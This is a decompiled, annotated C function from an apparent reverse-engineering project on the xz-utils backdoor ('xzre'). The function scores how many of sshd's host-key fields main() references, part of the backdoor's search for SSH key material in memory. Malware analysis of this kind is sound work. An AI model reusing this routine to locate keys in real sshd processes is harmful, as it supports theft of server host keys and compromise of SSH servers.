// /home/kali/xzre-ghidra/xzregh/103910_sshd_get_sensitive_data_score_in_main.c
// Function: sshd_get_sensitive_data_score_in_main @ 0x103910
// Calling convention: __stdcall
// Prototype: int __stdcall sshd_get_sensitive_data_score_in_main(void * sensitive_data, elf_info_t * elf, string_references_t * refs)


/*
 * AutoDoc: Scans the cached `main()` range for absolute references to `sensitive_data->host_keys`, `sensitive_data->host_pubkeys`, and `sensitive_data->host_certificates` (+0/+8/+0x10). The return value is the number of fields referenced (0-3) and is doubled later in the aggregate score.
 */

#include "xzre_types.h"

int sshd_get_sensitive_data_score_in_main
              (void *sensitive_data,elf_info_t *elf,string_references_t *refs)

{
  u8 *code_start;
  u8 *code_end;
  BOOL host_keys_hit;
  BOOL host_certificates_hit;
  BOOL host_pubkeys_hit;
  int score;
  u8 *main_end;
  u8 *main_start;
  
  score = 0;
  // AutoDoc: Reuse the `list_hostkey_types` string reference to bound sshd's `main()` implementation before scanning.
  code_start = (u8 *)(refs->list_hostkey_types).func_start;
  if (code_start != (u8 *)0x0) {
    code_end = (u8 *)(refs->list_hostkey_types).func_end;
    // AutoDoc: Count a hit when `main()` materialises `&sensitive_data->host_keys` (the struct base).
    host_keys_hit = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
    // AutoDoc: Count a hit when `main()` materialises `&sensitive_data->host_certificates` (+0x10).
    host_certificates_hit = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 0x10));
    // AutoDoc: Count a hit when `main()` materialises `&sensitive_data->host_pubkeys` (+8).
    host_pubkeys_hit = find_instruction_with_mem_operand
                      (code_start,code_end,(dasm_ctx_t *)0x0,(void *)((long)sensitive_data + 8));
    // AutoDoc: Sum the three boolean hits into the 0-3 score that later feeds the aggregate heuristic.
    score = (((uint)(host_keys_hit != FALSE) - (uint)(host_certificates_hit == FALSE)) + 2) - (uint)(host_pubkeys_hit == FALSE);
  }
  return score;
}

